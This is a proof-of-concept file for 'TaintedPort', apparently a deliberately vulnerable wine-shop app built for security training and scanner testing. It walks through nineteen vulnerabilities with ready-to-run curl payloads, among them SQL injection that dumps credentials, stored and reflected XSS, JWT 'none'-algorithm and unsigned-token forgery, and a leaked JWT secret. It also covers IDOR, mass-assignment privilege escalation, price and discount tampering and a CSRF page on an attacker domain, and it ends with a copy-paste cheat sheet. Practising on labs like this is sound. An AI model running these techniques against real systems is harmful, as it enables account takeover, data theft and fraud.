============================================================
  TaintedPort - Vulnerability Proof of Concept (PoC)
  Exploitation payloads for each known vulnerability.
============================================================

Default credentials:
  joe@example.com   / password123  (user id: 1, has 2 pre-seeded orders: #1, #2)
  jane@example.com  / password123  (user id: 2, has 3 pre-seeded orders: #3, #4, #5)
  admin@example.com / password123  (user id: 3, admin role, access to /admin)

Frontend: https://taintedport.com
API:      https://api.taintedport.com
Local:    http://localhost:8080 (frontend) / http://localhost:8080/api/ (API)


=== 1. SQL Injection - Login Email ===
CWE-89 | High | POST /auth/login

Payload:
  curl -X POST https://api.taintedport.com/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email": "'\'' OR 1=1 --", "password": "anything"}'

How it works:
  The email is concatenated into: SELECT * FROM users WHERE email = '<input>'
  Injecting ' OR 1=1 -- makes the query:
    SELECT * FROM users WHERE email = '' OR 1=1 --'
  This returns the first user (joe@example.com), bypassing authentication.

Extract all users:
  curl -X POST https://api.taintedport.com/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email": "'\'' UNION SELECT 1,name,email,password_hash,is_admin,totp_secret,totp_enabled,created_at FROM users--", "password": "x"}'


=== 2. SQL Injection - Wine Detail (ID) ===
CWE-89 | High | GET /wines/:id

Payload (extract user credentials via UNION - wines table has 15 columns):
  curl "https://api.taintedport.com/wines/0 UNION SELECT 1,email,password_hash,name,5,6,7,8,totp_secret,is_admin,11,12,13,14,15 FROM users--"

Payload (extract table names):
  curl "https://api.taintedport.com/wines/0 UNION SELECT 1,name,type,sql,5,6,7,8,9,10,11,12,13,14,15 FROM sqlite_master--"

How it works:
  The wine ID is concatenated into: SELECT * FROM wines WHERE id = <input>
  The wines table has 15 columns, so UNION SELECT must have 15 values.
  Use id=0 (no matching wine) so only the UNION result is returned.
  The route accepts non-numeric values, so arbitrary SQL can be appended.


=== 3. Reflected XSS - Login Email ===
CWE-79 | Medium | POST /auth/login

Payload:
  curl -X POST https://api.taintedport.com/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email": "<img src=x onerror=alert(document.domain)>", "password": "wrong"}'

How it works:
  On failed login, the API responds with:
    "Login failed for <img src=x onerror=alert(document.domain)>. Please check your credentials."
  The frontend renders this error message using dangerouslySetInnerHTML,
  causing the JavaScript in the onerror handler to execute.

Browser test:
  1. Go to https://taintedport.com/login
  2. Enter email: <img src=x onerror=alert('XSS')>
  3. Enter any password
  4. Click Sign In
  5. The alert fires in the error message area


=== 4. Reflected XSS - Wine Search ===
CWE-79 | Medium | GET /wines?search=<payload>

Payload (API):
  curl "https://api.taintedport.com/wines?search=<img+src=x+onerror=alert('XSS')>"

Response includes:
  "message": "Showing results for: <img src=x onerror=alert('XSS')>"

Browser test:
  1. Go to https://taintedport.com/wines
  2. In the search box, type: <img src=x onerror=alert('XSS-search')>
  3. Press Enter or wait for search
  4. The alert fires below the page header


=== 5. Stored XSS - User Name (Account Page / Navbar) ===
CWE-79 | Medium | PUT /auth/profile

Payload:
  # First, login to get a token
  TOKEN=$(curl -s -X POST https://api.taintedport.com/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email": "joe@example.com", "password": "password123"}' | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

  # Set name to XSS payload
  curl -X PUT https://api.taintedport.com/auth/profile \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"name": "<img src=x onerror=alert(document.cookie)>"}'

How it works:
  The name is stored in the database without sanitization.
  The Navbar renders "Hi, <name>" using dangerouslySetInnerHTML.
  Every page the user visits will trigger the XSS payload.

Browser test:
  1. Log in at https://taintedport.com/login
  2. Go to Account
  3. Click the pencil icon next to your name
  4. Change name to: <img src=x onerror=alert('stored-XSS')>
  5. Save - the alert fires in the navbar on every page


=== 6. Stored XSS - Shipping Name (Checkout / Order Detail) ===
CWE-79 | Medium | POST /orders

Payload:
  # Login and get token (see #5 above)

  # Add a wine to cart first
  curl -X POST https://api.taintedport.com/cart/add \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"wine_id": 1, "quantity": 1}'

  # Place order with XSS in shipping name
  curl -X POST https://api.taintedport.com/orders \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{
      "shipping_address": {
        "name": "<img src=x onerror=alert(document.cookie)>",
        "street": "123 Test St",
        "city": "Lisboa",
        "postal_code": "1000-001",
        "phone": "+351999999999"
      }
    }'

How it works:
  The shipping name is stored in the orders table without sanitization.
  The order detail page (/orders/:id) renders the shipping name using
  dangerouslySetInnerHTML. Anyone viewing the order sees the XSS fire.

Browser test:
  1. Log in, add a wine to cart, go to Checkout
  2. Set Full Name to: <img src=x onerror=alert('order-XSS')>
  3. Fill in other fields, place order
  4. Go to Account -> Order History -> View Details
  5. The alert fires on the order detail page


=== 7. JWT "none" Algorithm ===
CWE-345 | High | Any authenticated endpoint

Payload:
  # Forge a token with alg=none (no signature needed)
  # Header:  {"alg":"none","typ":"JWT"}  -> eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
  # Payload: {"user_id":1,"email":"joe@example.com","exp":9999999999}
  #   -> eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImV4cCI6OTk5OTk5OTk5OX0

  TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImV4cCI6OTk5OTk5OTk5OX0."

  curl -H "Authorization: Bearer $TOKEN" https://api.taintedport.com/auth/me

Expected result:
  Returns joe@example.com's account data without knowing the JWT secret.

Impersonate any user:
  # Change user_id to target any user in the system
  # Payload: {"user_id":2,"email":"other@example.com","exp":9999999999}
  TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoyLCJlbWFpbCI6Im90aGVyQGV4YW1wbGUuY29tIiwiZXhwIjo5OTk5OTk5OTk5fQ."

  curl -H "Authorization: Bearer $TOKEN" https://api.taintedport.com/auth/me


=== 8. JWT Signature Not Verified ===
CWE-347 | High | Any authenticated endpoint

Payload:
  # Take any valid JWT and modify the payload while keeping a garbage signature
  # Header (HS256): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
  # Tampered payload (user_id changed to 1):
  PAYLOAD=$(echo -n '{"user_id":1,"email":"joe@example.com","exp":9999999999}' | \
    python3 -c "import sys,base64; print(base64.urlsafe_b64encode(sys.stdin.buffer.read()).rstrip(b'=').decode())")

  TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.${PAYLOAD}.INVALIDSIGNATURE"

  curl -H "Authorization: Bearer $TOKEN" https://api.taintedport.com/auth/me

How it works:
  The JWT decode function compares the signature but only logs a warning
  on mismatch - it does NOT reject the token. Any payload with any
  signature (or garbage signature) is accepted as valid.


=== 9. Directory Listing ===
CWE-548 | Medium | /files/

URLs:
  https://taintedport.com/files/
  https://api.taintedport.com/files/

Sensitive files exposed:
  /files/api/config/jwt.php        -> JWT secret key: pTg7Kz9mQxR4vL2wN8jF5dY1hA6cB3eS0uI
  /files/api/config/database.php   -> Database configuration
  /files/api/config/totp.php       -> TOTP implementation
  /files/database.db               -> Full SQLite database (user credentials, orders, etc.)
  /files/api/controllers/          -> All controller source code
  /files/api/models/               -> All model source code
  /files/api/middleware/            -> Auth middleware source code
  /files/setup_db.php              -> Database schema and seed data

Exploit:
  # Download the entire database
  curl -o database.db https://taintedport.com/files/database.db

  # Read the JWT secret
  curl https://taintedport.com/files/api/config/jwt.php

  # Now you can forge valid HS256 tokens using the leaked secret


=== 10. CSRF on Checkout ===
CWE-352 | Medium | POST /orders

CORS misconfiguration:
  The API reflects any Origin header in Access-Control-Allow-Origin with
  Access-Control-Allow-Credentials: true. This allows any website to make
  authenticated cross-origin requests.

  curl -v -H "Origin: https://evil.com" https://api.taintedport.com/wines
  # Response includes: Access-Control-Allow-Origin: https://evil.com

PoC (host on attacker-controlled domain):
  <html>
  <body>
  <h1>Congratulations! You won a free wine tasting!</h1>
  <p>Click the button to claim your prize...</p>
  <button onclick="exploit()">Claim Prize</button>
  <script>
  function exploit() {
    // The permissive CORS allows this cross-origin request
    // Combined with XSS (vuln #5), an attacker can steal the JWT from localStorage
    // and use it to place orders on behalf of the victim
    var token = ''; // Obtained via XSS: localStorage.getItem('token')

    fetch('https://api.taintedport.com/orders', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + token
      },
      body: JSON.stringify({
        shipping_address: {
          name: 'Attacker',
          street: '123 Evil Street',
          city: 'Hackville',
          postal_code: '00000',
          phone: '000000000'
        },
        delivery_notes: 'Placed via CSRF'
      })
    }).then(r => r.json()).then(d => console.log('Order placed:', d));
  }
  </script>
  </body>
  </html>

Note:
  Since authentication uses JWT tokens in localStorage (not cookies),
  pure CSRF requires combining with an XSS vulnerability to steal the
  token first. However, the permissive CORS policy itself is the core
  misconfiguration that DAST scanners will flag.


=== 11. BOLA (IDOR) on Order Details ===
CWE-639 | High | GET /orders/:id

Payload:
  # Login as user A
  TOKEN_A=$(curl -s -X POST https://api.taintedport.com/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email": "joe@example.com", "password": "password123"}' | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

  # View another user's order (e.g., order #1, #2, #3 ...)
  curl -H "Authorization: Bearer $TOKEN_A" https://api.taintedport.com/orders/1
  curl -H "Authorization: Bearer $TOKEN_A" https://api.taintedport.com/orders/2
  curl -H "Authorization: Bearer $TOKEN_A" https://api.taintedport.com/orders/3

How it works:
  The GET /orders/:id endpoint only checks that the user is authenticated,
  NOT that they own the order. Any authenticated user can enumerate all
  orders by incrementing the ID and view shipping details, items, and totals
  belonging to other users.


=== 12. BOLA / Mass Assignment on Profile Update ===
CWE-639 | High | PUT /auth/profile

Payload:
  # Login as attacker
  TOKEN=$(curl -s -X POST https://api.taintedport.com/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email": "joe@example.com", "password": "password123"}' | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

  # Change user #2's name (not your own account)
  curl -X PUT https://api.taintedport.com/auth/profile \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"name": "HACKED", "user_id": 2}'

How it works:
  The profile update endpoint accepts an optional user_id in the request body.
  If present, it updates THAT user's name instead of the authenticated user's.
  The server does not verify that the user_id matches the token's user.


=== 13. Price Manipulation on Cart ===
CWE-472 | High | POST /cart/add

Payload:
  # Login
  TOKEN=$(curl -s -X POST https://api.taintedport.com/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email": "joe@example.com", "password": "password123"}' | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

  # Add wine #1 to cart with a price of 0.01
  curl -X POST https://api.taintedport.com/cart/add \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"wine_id": 1, "quantity": 1, "price": 0.01}'

  # Check cart - wine is now priced at 0.01
  curl -H "Authorization: Bearer $TOKEN" https://api.taintedport.com/cart

How it works:
  The cart add endpoint accepts an optional price field. If provided, it
  updates the wine's actual price in the database before adding to cart.
  The attacker pays 0.01 for a wine that costs hundreds of euros.
  Note: this also affects the price for ALL users since it modifies the DB.


=== 14. Broken Access Control on 2FA Disable ===
CWE-639 | High | POST /auth/2fa/disable

Payload:
  # Login as attacker (knows their own password)
  TOKEN=$(curl -s -X POST https://api.taintedport.com/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email": "joe@example.com", "password": "password123"}' | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

  # Disable 2FA for user #2 (victim) using attacker's own password
  curl -X POST https://api.taintedport.com/auth/2fa/disable \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"password": "password123", "user_id": 2}'

How it works:
  The 2FA disable endpoint validates the password against the authenticated
  user (attacker), but if a user_id parameter is provided, it disables 2FA
  for THAT user instead. The attacker only needs to know their own password.


=== 15. Discount Code Bypass ===
CWE-472 | High | POST /orders

Payload (100% discount - free order):
  # Login and add items to cart first (see examples above)

  curl -X POST https://api.taintedport.com/orders \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{
      "shipping_address": {
        "name": "Free Wine",
        "street": "123 Test St",
        "city": "Lisboa",
        "postal_code": "1000-001",
        "phone": "+351999999999"
      },
      "discount_code": "ANYTHING",
      "discount_percent": 100
    }'

Payload (negative total - store owes you money):
  curl -X POST https://api.taintedport.com/orders \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{
      "shipping_address": {
        "name": "Credit Exploit",
        "street": "123 Test St",
        "city": "Lisboa",
        "postal_code": "1000-001",
        "phone": "+351999999999"
      },
      "discount_code": "GIVEMEMONEY",
      "discount_percent": 200
    }'

How it works:
  The checkout endpoint accepts discount_code and discount_percent fields.
  Any non-empty string is accepted as a valid discount code. The
  discount_percent value is applied directly with no cap - 100 means
  free, >100 means negative total (credit).


------------------------------------------------------------
16. PRIVILEGE ESCALATION VIA MASS ASSIGNMENT ON REGISTRATION
------------------------------------------------------------

Register a new admin account:

  curl -X POST https://api.taintedport.com/auth/register \
    -H "Content-Type: application/json" \
    -d '{
      "name": "Evil Admin",
      "email": "evil@attacker.com",
      "password": "password123",
      "is_admin": 1
    }'

Expected response:
  {"success":true,"message":"User registered successfully","token":"...","user":{"id":4,"name":"Evil Admin","email":"evil@attacker.com","is_admin":true}}

The is_admin field in the request body is passed directly to the database.
The new account has full admin access to /admin and all admin API endpoints.


------------------------------------------------------------
17. PRIVILEGE ESCALATION VIA JWT CLAIM FORGERY (CHAIN)
------------------------------------------------------------

This is a multi-step exploit that chains JWT vulnerabilities (#7/#8)
with the JWT-claim-based admin check:

Step 1 - Login as any regular user to get a valid JWT:

  curl -X POST https://api.taintedport.com/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email": "joe@example.com", "password": "password123"}'

Step 2 - Decode the JWT payload (base64url), add is_admin:

  Original payload: {"user_id":1,"email":"joe@example.com","is_admin":false,"iat":...,"exp":...}
  Modified payload: {"user_id":1,"email":"joe@example.com","is_admin":true,"iat":1700000000,"exp":9999999999}

Step 3 - Forge a token using the "none" algorithm:

  Header:  {"alg":"none","typ":"JWT"}  -> base64url: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
  Payload: {"user_id":1,"email":"joe@example.com","is_admin":true,"exp":9999999999}
           -> base64url: eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImlzX2FkbWluIjp0cnVlLCJleHAiOjk5OTk5OTk5OTl9

  Forged token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImlzX2FkbWluIjp0cnVlLCJleHAiOjk5OTk5OTk5OTl9.

Step 4 - Use the forged token to access admin endpoints:

  curl https://api.taintedport.com/admin/orders \
    -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImlzX2FkbWluIjp0cnVlLCJleHAiOjk5OTk5OTk5OTl9."

How it works:
  The AdminController reads is_admin from the JWT payload rather than the
  database. The JWT decode accepts tokens with alg=none (no signature
  needed) and also doesn't verify signatures for HS256. An attacker can
  modify the payload to include is_admin=true and gain full admin access.
  This creates a vulnerability chain: JWT weakness -> privilege escalation.


------------------------------------------------------------
18. BOPLA - EXCESSIVE DATA EXPOSURE ON ORDER DETAILS
------------------------------------------------------------

Fetch any order (using the existing BOLA) and observe leaked user properties:

  # Login as joe
  TOKEN=$(curl -s -X POST https://api.taintedport.com/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"joe@example.com","password":"password123"}' | \
    python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

  # Fetch Jane's order (BOLA) and observe leaked user data (BOPLA)
  curl -s https://api.taintedport.com/orders/3 \
    -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

Expected response includes sensitive user properties:
  {
    "order": {
      "id": 3,
      "user_id": 2,
      "owner_name": "Jane Doe",
      "owner_email": "jane@example.com",
      "owner_password_hash": "$2y$10$...",     <-- LEAKED
      "owner_totp_secret": "JBSWY3DPEHPK...", <-- LEAKED (if 2FA enabled)
      "owner_is_admin": 0,                     <-- LEAKED
      "shipping_name": "Jane Doe",
      ...
    }
  }

How it works:
  The Order model's getById() JOINs with the users table and includes
  password_hash, totp_secret, and is_admin in the response. The frontend
  ignores these fields, but they are fully visible in the API response.
  Combined with BOLA (#11), an attacker can harvest credentials and 2FA
  secrets for all users by enumerating order IDs.


------------------------------------------------------------
19. BFLA - ORDER STATUS UPDATE VIA REQUEST BODY ADMIN FLAG
------------------------------------------------------------

Change any order's status as a regular user by passing is_admin:true:

  # Login as joe (regular user)
  TOKEN=$(curl -s -X POST https://api.taintedport.com/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"joe@example.com","password":"password123"}' | \
    python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

  # Change order #3 (Jane's order) status to "cancelled" - as a regular user
  curl -X PUT https://api.taintedport.com/orders/3/status \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"is_admin": true, "status": "cancelled"}'

Expected response:
  {"success":true,"message":"Order status updated to cancelled."}

Without is_admin:true, you get:
  {"success":false,"message":"Admin access required."}

How it works:
  The PUT /orders/:id/status endpoint checks if is_admin is truthy in
  the request body instead of verifying the user's actual role. Any
  authenticated user can perform admin-level order management by simply
  including "is_admin": true in their JSON payload.


============================================================
  CHEAT SHEET - Quick Copy-Paste Payloads
============================================================

SQLi login bypass:       ' OR 1=1 --
SQLi wine UNION:         0 UNION SELECT 1,email,password_hash,name,5,6,7,8,totp_secret,is_admin,11,12,13,14,15 FROM users--
XSS login email:         <img src=x onerror=alert('XSS')>
XSS wine search:         <img src=x onerror=alert('XSS')>
XSS stored name:         <img src=x onerror=alert('XSS')>
XSS stored order:        <img src=x onerror=alert('XSS')>
JWT none token:          eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImV4cCI6OTk5OTk5OTk5OX0.
Directory listing:       /files/
JWT secret (from dir):   pTg7Kz9mQxR4vL2wN8jF5dY1hA6cB3eS0uI
BOLA order:              GET /orders/1 (with any user's token)
Mass assignment:         {"name": "HACKED", "user_id": 2}
Price manipulation:      {"wine_id": 1, "quantity": 1, "price": 0.01}
2FA disable IDOR:        {"password": "yourpass", "user_id": 2}
Free order:              {"discount_code": "X", "discount_percent": 100}
Priv esc (register):     {"name":"x","email":"x@x.com","password":"password123","is_admin":1}
Priv esc (JWT forge):    eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImlzX2FkbWluIjp0cnVlLCJleHAiOjk5OTk5OTk5OTl9.
BOPLA (order leak):      GET /orders/3 â†’ owner_password_hash, owner_totp_secret
BFLA (order status):     {"is_admin": true, "status": "cancelled"}
